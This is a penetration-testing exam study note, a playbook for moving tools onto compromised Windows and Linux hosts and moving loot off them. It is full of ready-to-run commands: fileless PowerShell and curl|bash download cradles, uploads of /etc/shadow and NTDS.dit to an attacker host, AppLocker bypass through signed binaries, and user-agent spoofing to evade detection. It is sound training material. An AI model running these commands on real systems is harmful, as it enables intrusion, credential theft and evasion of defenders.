# NOTE — File Transfers Methodology (Exam Playbook)

## ID
717

## Module
File Transfers

## Kind
methodology

## Title
File Transfers — Get-The-File-In/Out Decision Playbook

## Description
Exam-ready playbook for moving tools onto a target and loot off it when host controls (AV/EDR, AppLocker, WDAC) and network controls (egress firewall, web filtering, IDS) block the obvious path. Decision-tree first: pick by direction × OS × which protocol egress allows. Commands drawn from this vault's own notes.

## Tags
methodology, file-transfer, exam, cheatsheet, decision-tree, download, upload, exfil, powershell-blocked, applocker, certutil-blocked, smb-blocked, no-curl, no-wget, base64, smbserver, webdav, lolbas, gtfobins, encrypt-loot, dev-tcp, netcat, reverse-shell-no-tools

---

## TL;DR — The Triage Flow

This module is **not** a linear chain — it's a lookup. Every transfer is answered by four questions, in order:

1. **Direction?** → file *in* (download to target) or file *out* (upload / exfil loot).
2. **Target OS?** → Windows or Linux (different native toolset).
3. **What's blocked?** → host control (binary won't run) vs network control (port/UA filtered) — they're independent.
4. **Which protocol does egress allow?** → HTTP(S) > SMB(445) > FTP(21) > raw TCP > WinRM(5985) > RDP > DNS/ICMP. Pick the highest one that's open.

> **Golden rule:** never rely on one method — any single technique can be killed by a host *or* network control. Have plan B/C/D ready and **always verify the hash** after transfer (`md5sum` ↔ `Get-FileHash`). Raw channels (nc, `/dev/tcp`) corrupt silently — the binary just fails to run later with no error.

> **OPSEC fork:** exfilling sensitive loot (NTDS.dit, hashes, configs)? **Encrypt the file before it leaves the host** (Phase 7) — even over HTTPS, IDS reads plaintext hashes and the client will ask. Don't burn time evading detection (Phase 8) unless scope explicitly allows evasive testing.

---

## Phase 0 — Triage (pick the channel before touching the keyboard)

**Goal:** turn "I need this file across" into one exact command.

| Constraint observed | Channel to reach for |
|---|---|
| Nothing blocked, HTTP egress | PowerShell/`wget`/`curl` from your HTTP server |
| PowerShell cradle blocked (AppLocker/WDAC) | LOLBin (`certutil`/`bitsadmin`/`certreq`) → Phase 6, or `cscript wget.vbs` → Phase 4 |
| Outbound :80/:443 blocked, :445 open | `impacket-smbserver` → Phase 1.C |
| :445 blocked, HTTP open | WebDAV (`wsgidav`) → Phase 1/3 |
| Only one weird TCP port open | Netcat/Ncat on that port → Phase 5 |
| No `curl`/`wget`/`nc` on target at all | Bash `/dev/tcp` → Phase 2.D / Phase 5 |
| Tiny file (key/config), no network path | base64 paste → Phase 1.A / 2.A |
| Already RDP'd in | `\\tsclient\` drive redirect → Phase 5 |
| Pivoting AD with admin creds, WinRM up | PS-Session `Copy-Item` → Phase 5 |
| Loot is sensitive | encrypt first (Phase 7) **then** pick a channel |

**Output checkpoint:** after this you have a primary method **and** a fallback, chosen by direction × OS × open protocol.

---

## Phase 1 — Download TO a Windows Target

**Trigger:** you have code-exec on Windows, need a tool (nc.exe, PrintSpoofer, mimikatz) on it.

### 1.A — base64 paste (no network; small files only)
```bash
# Attacker
md5sum tool.exe
cat tool.exe | base64 -w 0 ; echo
```
```powershell
# Windows target
[IO.File]::WriteAllBytes("C:\Users\Public\tool.exe",[Convert]::FromBase64String("<B64>"))
Get-FileHash C:\Users\Public\tool.exe -Algorithm md5     # must match
```
> `cmd.exe` truncates strings > **8191 chars** → corrupt file. Keys/configs only.

### 1.B — PowerShell web (HTTP/HTTPS — usually open)
```powershell
(New-Object Net.WebClient).DownloadFile('http://<ME>/tool.exe','C:\Users\Public\tool.exe')
IEX (New-Object Net.WebClient).DownloadString('http://<ME>/script.ps1')   # FILELESS, no disk
Invoke-WebRequest http://<ME>/tool.exe -OutFile C:\tool.exe -UseBasicParsing
```
`Net.WebClient` is faster than `iwr`. `-UseBasicParsing` fixes the IE-engine error. SSL error → `[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true}` first.

### 1.C — SMB (TCP/445)
```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare                    # anon
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test   # if guest blocked
```
```cmd
copy \\<ME>\share\nc.exe                          ::  anon
net use n: \\<ME>\share /user:test test  &  copy n:\nc.exe   ::  with creds
```

### 1.D — FTP (TCP/21)
```bash
sudo python3 -m pyftpdlib --port 21
```
```powershell
(New-Object Net.WebClient).DownloadFile('ftp://<ME>/file','C:\Users\Public\file')
```
Non-interactive shell → build a command file:
```cmd
echo open <ME> > c.txt & echo USER anonymous >> c.txt & echo binary >> c.txt & echo GET file >> c.txt & echo bye >> c.txt
ftp -v -n -s:c.txt
```

**Output checkpoint:** tool on disk (or in memory via `IEX`), hash verified.

---

## Phase 2 — Download TO a Linux Target

**Trigger:** shell on Linux box, need LinEnum/exploit on it.

### 2.A — base64 paste
```bash
# attacker:  cat f | base64 -w 0 ; echo      |     target:
echo -n '<B64>' | base64 -d > f ; md5sum f
```
### 2.B — wget / curl
```bash
wget http://<ME>/LinEnum.sh -O /tmp/LinEnum.sh        # capital -O
curl http://<ME>/LinEnum.sh -o /tmp/LinEnum.sh        # lowercase -o
```
### 2.C — fileless pipe
```bash
curl http://<ME>/x.sh | bash
wget -qO- http://<ME>/x.py | python3                  # capital O + hyphen
```
### 2.D — `/dev/tcp` (NO curl/wget/nc on box — Bash built-in)
```bash
exec 3<>/dev/tcp/<ME>/80
echo -e "GET /LinEnum.sh HTTP/1.1\nHost: <ME>\n\n" >&3
cat <&3
```
### 2.E — SCP (SSH outbound allowed)
```bash
sudo systemctl enable ssh --now            # attacker; confirm: ss -lnpt | grep :22
scp tempuser@<ME>:/srv/tool .              # use a TEMP user, never real attacker creds
```

**Output checkpoint:** file on target; if `/dev/tcp`, strip HTTP headers before use.

---

## Phase 3 — Upload / Exfil FROM a Target

**Trigger:** you have loot (hashes, NTDS.dit, configs) to pull off.

### 3.A — Linux loot over HTTPS (recommended)
```bash
# Attacker
python3 -m pip install --user uploadserver
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
mkdir https && cd https                                       # DON'T serve from cert dir
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```
```bash
# Target
curl -X POST https://<ME>/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```
### 3.B — Windows → uploadserver (PSUpload)
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://<ME>:8000/upload -File C:\loot.txt
```
### 3.C — base64 over POST → nc catcher
```bash
nc -lvnp 8000          # attacker
```
```powershell
$b64=[Convert]::ToBase64String((Get-Content -Path 'C:\loot' -Encoding Byte))
Invoke-WebRequest -Uri http://<ME>:8000/ -Method POST -Body $b64
```
Then attacker: `echo <B64> | base64 -d > loot`.

### 3.D — Nginx HTTP PUT catcher (stable, HTTPS-capable)
```bash
sudo mkdir -p /var/www/uploads/SecretUploadDirectory
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
# /etc/nginx/sites-available/upload.conf:
#   server { listen 9001; location /SecretUploadDirectory/ { root /var/www/uploads; dav_methods PUT; } }
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
sudo rm /etc/nginx/sites-enabled/default            # Pwnbox websockify holds :80 — use 9001
sudo systemctl restart nginx.service
curl -T /etc/passwd http://<ME>:9001/SecretUploadDirectory/users.txt      # -T uppercase = PUT
```
### 3.E — WebDAV upload (SMB 445 blocked, HTTP open)
```bash
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous        # attacker
```
```cmd
copy C:\loot \\<ME>\DavWWWRoot\        :: DavWWWRoot = magic keyword, dir need not exist
```
### 3.F — FTP upload
```bash
sudo python3 -m pyftpdlib --port 21 --write
```
```powershell
(New-Object Net.WebClient).UploadFile('ftp://<ME>/loot','C:\loot')
```

**Output checkpoint:** loot on attacker host, hash-verified, and **deleted from the target**.

> **Direction trap:** a Python web server on the *attacker* is for the target to pull from. A web server on the *target* lets the attacker `wget` loot off it. Same exfil, opposite inbound direction — don't confuse them.

---

## Phase 4 — Code-Runtime One-Liners (binaries missing/blocked)

**Trigger:** `curl`/`wget`/`certutil` gone or blocked, but a language runtime is installed.

```bash
# Python3 / Python2
python3 -c 'import urllib.request;urllib.request.urlretrieve("http://<ME>/f","f")'
python2.7 -c 'import urllib;urllib.urlretrieve("http://<ME>/f","f")'
# PHP (~77% of web servers have it)
php -r '$f=file_get_contents("http://<ME>/x");file_put_contents("x",$f);'
php -r '$l=@file("http://<ME>/x.sh");foreach($l as $n=>$ln){echo $ln;}' | bash    # fileless
# Ruby / Perl
ruby -e 'require "net/http";File.write("f",Net::HTTP.get(URI.parse("http://<ME>/f")))'
perl -e 'use LWP::Simple;getstore("http://<ME>/f","f");'
# Python3 upload
python3 -c 'import requests;requests.post("http://<ME>:8000/upload",files={"files":open("loot","rb")})'
```
**Windows, PowerShell blocked → `cscript`** (rarely AppLocker'd). Save `wget.vbs`:
```vbscript
dim x:Set x=createobject("Microsoft.XMLHTTP"):dim s:Set s=createobject("Adodb.Stream")
x.Open "GET",WScript.Arguments.Item(0),False:x.Send
with s:.type=1:.open:.write x.responseBody:.savetofile WScript.Arguments.Item(1),2:end with
```
```cmd
cscript.exe /nologo wget.vbs http://<ME>/nc.exe nc.exe
```

**Output checkpoint:** file transferred via runtime, no watched binary touched.

---

## Phase 5 — Non-HTTP Channels (raw TCP / WinRM / RDP)

**Trigger:** HTTP/FTP/SMB all blocked, or you're already pivoting in-network.

### 5.A — Netcat / Ncat
```bash
# Direction A — target listens, attacker pushes
nc -lnp 8000 > tool             # target  (Ncat: ncat -lp 8000 --recv-only > tool)
nc -q0 <TGT> 8000 < tool        # attacker (Ncat: ncat --send-only <TGT> 8000 < tool)
# Direction B — attacker listens, target pulls (target firewall blocks inbound)
sudo nc -lnp 443 -q0 < tool     # attacker
nc <ME> 443 > tool              # target  (or:  cat < /dev/tcp/<ME>/443 > tool)
```
> Pwnbox aliases `nc`/`ncat`/`netcat` → **Ncat**. `-q` won't work — use `--send-only`/`--recv-only`. Without a close flag the pipe hangs and you can't tell when it finished.

### 5.B — PowerShell Remoting (WinRM 5985/5986)
```powershell
Test-NetConnection -ComputerName DB01 -Port 5985
$S = New-PSSession -ComputerName DB01
Copy-Item -Path C:\tool.exe -ToSession $S -Destination C:\Users\Public\     # push
Copy-Item -Path C:\loot -FromSession $S -Destination C:\                    # pull
```
Needs admin / Remote Management Users on remote. `-ToSession` vs `-FromSession` — easy to invert.

### 5.C — RDP drive redirection
```bash
xfreerdp /v:<TGT> /d:<DOM> /u:<U> /p:'<P>' /drive:linux,/home/user/share
rdesktop <TGT> -d <DOM> -u <U> -p '<P>' -r disk:linux='/home/user/share'
```
Inside the session: `\\tsclient\linux` (or `\\tsclient\<sharename>`). Visible only to the RDP user — stealthy, no port/listener.

**Output checkpoint:** file moved over a non-HTTP path; hash verified (raw nc has no length check).

---

## Phase 6 — Living off the Land (AppLocker / whitelisting bypass)

**Trigger:** PowerShell and Netcat blocked, but Microsoft/distro-signed binaries are allowed.

```cmd
:: Windows download
certutil -urlcache -split -f http://<ME>:8000/nc.exe nc.exe     :: AMSI-flagged on modern Defender
bitsadmin /transfer j /priority foreground http://<ME>:8000/nc.exe C:\Temp\nc.exe
```
```powershell
Import-Module bitstransfer; Start-BitsTransfer -Source http://<ME>:8000/nc.exe -Destination C:\Temp\nc.exe
GfxDownloadWrapper.exe "http://<ME>/nc.exe" "C:\Temp\nc.exe"     :: obscure, rarely rule-covered
```
```cmd
:: Windows UPLOAD via certreq (underwatched vs certutil)
certreq.exe -Post -config http://<ME>:8000/ c:\windows\win.ini   :: nc -lvnp 8000 catches the POST
```
```bash
# Linux GTFOBin — openssl TLS transfer (openssl is ~universal)
openssl req -newkey rsa:2048 -nodes -keyout k.pem -x509 -days 365 -out c.pem      # attacker
openssl s_server -quiet -accept 80 -cert c.pem -key k.pem < /tmp/LinEnum.sh       # attacker
openssl s_client -connect <ME>:80 -quiet > LinEnum.sh                             # target
```
Workflow: identify the constraint → filter **LOLBAS** (`/download/`,`/upload/`) or **GTFOBins** (`+file download/upload`) → prefer the most obscure signed binary → test in a known-good env first.

**Output checkpoint:** transfer done via a trusted signed binary; remember `bitsadmin /list` → `/cancel <job>` to clean lingering jobs.

---

## Phase 7 — Protect the Loot (encrypt before exfil)

**Trigger:** exfilling NTDS.dit / hashes / creds, especially over a plaintext channel.

```powershell
Import-Module .\Invoke-AESEncryption.ps1
Invoke-AESEncryption -Mode Encrypt -Key "<ENGAGEMENT_PWD>" -Path .\loot.txt   # → loot.txt.aes
```
```bash
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
```
Rules: **one random password per engagement**; **always pass `-pbkdf2`** (default KDF is broken MD5); encrypt the *file* even on encrypted transport; delete loot after exfil and verify.

**Output checkpoint:** loot encrypted at rest, decryptable by you, IDS sees ciphertext only.

---

## Phase 8 — Evade Detection (only if scope allows evasive testing)

**Trigger:** UA/command-line filtering is dropping standard transfers.

```powershell
$UA=[Microsoft.PowerShell.Commands.PSUserAgent]::Chrome    # built-ins are OLD — prefer a fresh real UA
Invoke-WebRequest http://<ME>/nc.exe -UserAgent $UA -OutFile C:\Users\Public\nc.exe
```
Default UA tells: `WindowsPowerShell/x.x` (iwr), `Microsoft-CryptoAPI/10.0` (certutil), `Microsoft BITS/7.8` (BITS), `WinHttp.WinHttpRequest.5` (COM). UA spoof only beats the proxy/IDS UA filter — process tree, AMSI script-block, DNS, netflow, JA3 still see you. Stack layers (spoof UA + LOLBin + signed-domain egress + slow rate), don't rely on one trick.

**Output checkpoint:** transfer blends at the UA layer; you've accepted the residual telemetry layers.

---

## Decision Tree (Under Exam Pressure)

```
Need a file moved
│
├── DIRECTION: tool IN to target ?
│   ├── Windows target
│   │   ├── HTTP egress open      → (New-Object Net.WebClient).DownloadFile / IEX  [1.B]
│   │   ├── PS cradle blocked     → certutil / bitsadmin / GfxDownloadWrapper      [6]
│   │   │                           └ also blocked → cscript wget.vbs              [4]
│   │   ├── :80/:443 blocked,445  → impacket-smbserver + copy \\ME\share           [1.C]
│   │   ├── 445 blocked, HTTP ok  → wsgidav WebDAV + copy \\ME\DavWWWRoot          [3.E]
│   │   ├── only FTP/21 open      → pyftpdlib + WebClient ftp:// / ftp -s:file     [1.D]
│   │   └── no network at all     → base64 paste (≤8191 chars)                     [1.A]
│   └── Linux target
│       ├── curl/wget present     → wget -O / curl -o   (| bash for fileless)      [2.B/2.C]
│       ├── NO curl/wget/nc       → exec 3<>/dev/tcp/ME/80                          [2.D]
│       ├── SSH egress open       → scp tempuser@ME:/srv/tool .                     [2.E]
│       └── tiny secret           → base64 paste                                   [2.A]
│
├── DIRECTION: loot OUT / exfil ?
│   ├── sensitive (hashes/NTDS)   → ENCRYPT FIRST (Invoke-AESEncryption/openssl)    [7]
│   ├── Linux + HTTPS             → uploadserver 443 + curl -F --insecure           [3.A]
│   ├── Windows + HTTP            → PSUpload Invoke-FileUpload / b64 POST → nc       [3.B/3.C]
│   ├── want stable catcher       → nginx dav_methods PUT + curl -T                 [3.D]
│   └── 445 blocked               → wsgidav WebDAV PUT                              [3.E]
│
├── HTTP/FTP/SMB ALL blocked
│   ├── one raw TCP port open     → nc/ncat (mind -q0 / --send-only)                [5.A]
│   ├── no nc on box              → cat < /dev/tcp/ME/PORT > file                   [5.A]
│   ├── WinRM up + admin          → New-PSSession + Copy-Item -To/-FromSession      [5.B]
│   └── already RDP'd             → \\tsclient\share                                [5.C]
│
├── runtime present, binaries gone → python/php/ruby/perl one-liner               [4]
│
└── STUCK > 15 min
    ├── re-check which port is ACTUALLY open (outbound, not just inbound)
    ├── flip direction: can't push? make target listen and pull, or vice versa
    ├── grep ../ATTACK-PATHS.md for the symptom
    ├── try a runtime one-liner (php on web boxes is near-guaranteed)
    └── last resort: base64 paste in chunks (works through any shell)
```

---

## Signal → Counter-Move Reference

| You see / observe | Likely cause | Counter-move |
|---|---|---|
| `Invoke-WebRequest`: "Internet Explorer engine is not available" | First-launch IE config not done | Add `-UseBasicParsing` |
| "Could not establish trust relationship for the SSL/TLS channel" | Self-signed cert on your server | `[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true}` before request |
| `copy \\ME\share` → "system error 1272 / access denied" | New Windows blocks anon guest SMB | `impacket-smbserver -user test -password test` + `net use n: ... /user:test test` |
| Transferred binary won't run / "not a valid Win32 app" | Silent truncation/corruption | base64 over 8191 in `cmd.exe`, or raw nc with no length check — re-send + verify hash |
| nc transfer never returns to prompt | No close flag on sender | `nc -q0` (orig) or `ncat --send-only`/`--recv-only` (Pwnbox) |
| `wget -qo-` does nothing useful | Lowercase `o` = log flag | Use capital `-qO-` (stdout) |
| `curl` refuses self-signed HTTPS | No `--insecure` | Add `--insecure` / `-k` |
| `php -r` → "command not found" | PHP CLI not installed (only mod_php) | Use python3/perl one-liner instead |
| `/dev/tcp` → "No such file or directory" | Shell is dash/ash, not Bash | It's a Bash feature — get a Bash shell, or use python one-liner |
| `certutil` download flagged/quarantined | AMSI/Defender signatures `certutil` | Switch to `bitsadmin`/`Start-BitsTransfer` or `GfxDownloadWrapper` |
| nginx: `bind() to 0.0.0.0:80 failed (98: in use)` | Pwnbox websockify holds :80 | Listen on 9001 + `rm /etc/nginx/sites-enabled/default` |
| `Copy-Item -ToSession` "access denied" | Not admin / not Remote Mgmt Users on remote | Different lateral method, or get the right group |
| WebDAV `copy \\ME\DavWWWRoot` hangs | WebClient service stopped on target | `net start webclient` (needs rights) — or use SMB/HTTP instead |
| Tools deleted from your *local* Linux share | Defender scanning through `\\tsclient\` | Don't stage malware in the redirected dir; encrypt/rename |
| `openssl s_client` exits instantly | stdin closed, server not up first | Start `s_server` first, redirect `> file` on client |

---

## Master Cheatsheet — One-Liners by Scenario

```bash
# === 1. Drop tool to Windows, HTTP open ===
python3 -m http.server 80                         # attacker
# target:
powershell -c "(New-Object Net.WebClient).DownloadFile('http://<ME>/nc.exe','C:\Users\Public\nc.exe')"

# === 2. Fileless PowerShell exec (no disk artifact) ===
# target:
powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://<ME>/PowerUp.ps1')"

# === 3. HTTP blocked, SMB open ===
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test   # attacker
net use n: \\<ME>\share /user:test test & copy n:\nc.exe                             # target

# === 4. PowerShell blocked → LOLBin ===
certutil -urlcache -split -f http://<ME>:8000/nc.exe nc.exe                          # target
bitsadmin /transfer j /priority foreground http://<ME>:8000/nc.exe C:\Temp\nc.exe    # target

# === 5. PowerShell + curl/wget all gone → cscript ===
cscript.exe /nologo wget.vbs http://<ME>/nc.exe nc.exe                               # target

# === 6. Linux box, no curl/wget/nc ===
exec 3<>/dev/tcp/<ME>/80; echo -e "GET /x.sh HTTP/1.1\nHost: <ME>\n\n" >&3; cat <&3  # target

# === 7. Exfil Linux loot over HTTPS ===
mkdir https && cd https && sudo python3 -m uploadserver 443 --server-certificate ~/server.pem  # attacker
curl -X POST https://<ME>/upload -F 'files=@/etc/shadow' --insecure                  # target

# === 8. Stable HTTP PUT catcher (nginx) ===
curl -T loot.txt http://<ME>:9001/SecretUploadDirectory/loot.txt                     # target

# === 9. Raw TCP, attacker listens, target pulls ===
sudo nc -lnp 443 -q0 < tool                                                          # attacker
nc <ME> 443 > tool   # or: cat < /dev/tcp/<ME>/443 > tool                             # target

# === 10. Encrypt loot before it leaves ===
openssl enc -aes256 -iter 100000 -pbkdf2 -in ntds.dit -out ntds.enc                  # target
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in ntds.enc -out ntds.dit              # attacker

# === 11. UA spoof (scope permitting) ===
powershell -c "$u=[Microsoft.PowerShell.Commands.PSUserAgent]::Chrome; Invoke-WebRequest http://<ME>/nc.exe -UserAgent $u -OutFile C:\Users\Public\nc.exe"

# === 12. WinRM lateral copy (pivoting AD) ===
$S=New-PSSession -ComputerName DB01; Copy-Item C:\nc.exe -ToSession $S -Destination C:\Users\Public\

# === Always: verify ===
md5sum file            # attacker  ↔  Get-FileHash file -Algorithm md5   # target
```

---

## Quick Reference — Tools by Function

| Function | Linux (attacker or target) | Windows (target) |
|---|---|---|
| HTTP serve (download) | `python3 -m http.server`, `php -S 0.0.0.0:8000`, `ruby -run -ehttpd . -p8000` | — |
| HTTP download | `wget -O`, `curl -o`, `/dev/tcp` | `Net.WebClient.DownloadFile`, `Invoke-WebRequest`, `certutil`, `bitsadmin` |
| Fileless exec | `curl \| bash`, `wget -qO- \| python3` | `IEX (New-Object Net.WebClient).DownloadString(...)` |
| SMB | `impacket-smbserver` | `copy \\ME\share`, `net use` |
| WebDAV (445→HTTP) | `wsgidav --auth=anonymous` | `\\ME\DavWWWRoot`, `net start webclient` |
| FTP | `python3 -m pyftpdlib [--write]` | `Net.WebClient ftp://`, `ftp -s:file` |
| Upload catcher | `python3 -m uploadserver`, `nginx dav_methods PUT`, `nc -lvnp` | (client side: PSUpload, `curl -F`) |
| Raw TCP | `nc`/`ncat` (`-q0`/`--send-only`), `/dev/tcp` | `nc.exe`, PowerShell TCP |
| In-network copy | — | `New-PSSession`+`Copy-Item`, `\\tsclient\` (RDP) |
| Runtime one-liner | python2/3, php, ruby, perl | `cscript wget.vbs/.js` |
| LOLBin / GTFOBin | `openssl s_server/s_client` | `certutil`, `certreq -Post`, `bitsadmin`, `GfxDownloadWrapper` |
| Encrypt loot | `openssl enc -aes256 -pbkdf2 -iter 100000` | `Invoke-AESEncryption.ps1` |
| Verify | `md5sum` | `Get-FileHash -Algorithm md5` |

Hash check both ends, every time. Channels with no length indicator (raw nc, base64-in-cmd) fail silently.

---

## Top Gotchas (Things That Will Burn You)

1. **`cmd.exe` truncates strings > 8191 chars.** base64 paste of anything but a tiny file → silently corrupt. Verify the hash or it'll bite you at exploitation time.
2. **Raw nc/`/dev/tcp` have no length check.** A truncated 200KB binary throws no error — you find out when it won't execute. Always `md5sum` ↔ `Get-FileHash`.
3. **Pwnbox aliases `nc`/`ncat`/`netcat` to Ncat.** `-q 0` does nothing — use `--send-only`/`--recv-only`, or the transfer hangs forever and you can't tell it's "done."
4. **`wget -qO-` is capital O + hyphen** (stdout). Lowercase `-qo-` is the log-file flag — silently writes nothing useful.
5. **`curl -T` (uppercase) = PUT upload; `-t` (lowercase) = telnet.** Easy to flip and wonder why nothing uploads.
6. **`certutil` is AMSI-flagged on modern Defender.** It is NOT a stealth bypass anymore — reach for `bitsadmin`/`Start-BitsTransfer` or an obscure LOLBin instead.
7. **`cscript` bypasses AppLocker, NOT EDR.** Sysmon/EDR log `cscript.exe` spawning a network connection. AppLocker bypass ≠ telemetry bypass.
8. **WebDAV needs the WebClient service running on the target** — disabled by default on Windows Server. `net start webclient` may need admin and may just fail.
9. **`openssl enc` without `-pbkdf2` uses a broken MD5 KDF.** Always pass `-pbkdf2 -iter 100000` — the default silently produces weak crypto, and KDF defaults changed between openssl 1.1.0/1.1.1.
10. **New Windows blocks anonymous SMB guest.** Default `impacket-smbserver` fails — fall back to `-user test -password test` + `net use ... /user:`.
11. **Pwnbox websockify holds TCP/80** — nginx/`uploadserver`/php-server on :80 = bind error. Use 9001/8000 or `rm sites-enabled/default`.
12. **Direction confusion:** a web/FTP server on the *attacker* = target pulls *in*. A server on the *target* = attacker pulls *out*. Same data, opposite inbound direction — name your files and know which way bytes flow.
13. **`-ToSession` vs `-FromSession` on `Copy-Item`** are inverse. `-ToSession` pushes to remote; `-FromSession` pulls from it. Wrong one = "file not found" on the wrong host.
14. **Defender scans inside `\\tsclient\`.** Malware staged in your redirected RDP dir can be deleted off your **local Linux** folder through the channel. Encrypt/rename before redirecting.
15. **Encrypt loot BEFORE it leaves the host.** HTTPS protects the channel, not your reputation — IDS still reads plaintext hashes mid-stream and the client will ask why. File-level AES is the second layer.
16. **One random password per engagement for loot encryption.** Reusing a key means one cracked archive exposes every client. Treat it like a master key.
17. **Built-in `PSUserAgent` strings are ancient** (Chrome 7, Firefox 4). Modern UA filtering still flags them — copy a current Chrome UA from a live browser for real evasion.
18. **`Net.WebClient` is faster than `Invoke-WebRequest`.** Use `iwr` only when you need cookies/headers/sessions; otherwise default to `WebClient` for speed.
19. **BITS jobs persist across reboot if not completed.** `bitsadmin /list` to find lingering jobs, `/cancel <job>` to clean up — orphaned jobs = unintended persistence the client will flag.
20. **Document every credential/file moved** — `proto://user:pass@host (source)`. The exam grades the chain; an unexplained tool on a box loses points even if the privesc worked.

---

## Related Vault Notes

- `[[01-introduction]]` — why fallbacks matter; the canonical IIS→PrintSpoofer scenario
- `[[02-windows-file-transfer-methods]]` — PowerShell / SMB / FTP / WebDAV / base64 (Windows)
- `[[03-linux-file-transfer-methods]]` — wget/curl / `/dev/tcp` / SCP / mini web servers
- `[[04-transferring-files-with-code]]` — python/php/ruby/perl/cscript one-liners
- `[[05-miscellaneous-file-transfer-methods]]` — nc/ncat / WinRM `Copy-Item` / RDP `\\tsclient\`
- `[[06-protected-file-transfers]]` — `Invoke-AESEncryption.ps1` / `openssl enc -pbkdf2`
- `[[07-catching-files-over-https]]` — nginx `dav_methods PUT` upload catcher
- `[[08-living-off-the-land]]` — LOLBAS/GTFOBins: certutil / certreq / bitsadmin / openssl
- `[[09-detection]]` — default User-Agent fingerprints per technique (blue-team view)
- `[[10-evading-detection]]` — UA spoofing + obscure LOLBins; defense-in-depth reality

External cross-vault:
- Need a shell to *run* these from: `[[../shells-payloads/00-METHODOLOGY]]`
- Privesc that needs a tool dropped (PrintSpoofer/LinPEAS): `[[../windows-privesc/00-METHODOLOGY]]`, `[[../linux-privallege-escalation/00-METHODOLOGY]]`
- Exfil across a pivot: `[[../pivoting-tunneling/00-METHODOLOGY]]`
- Triage by symptom: `[[../ATTACK-PATHS]]`
- Index: `[[../SEARCH]]` · Exam pitfalls: `[[../EXAM-WARNINGS]]`
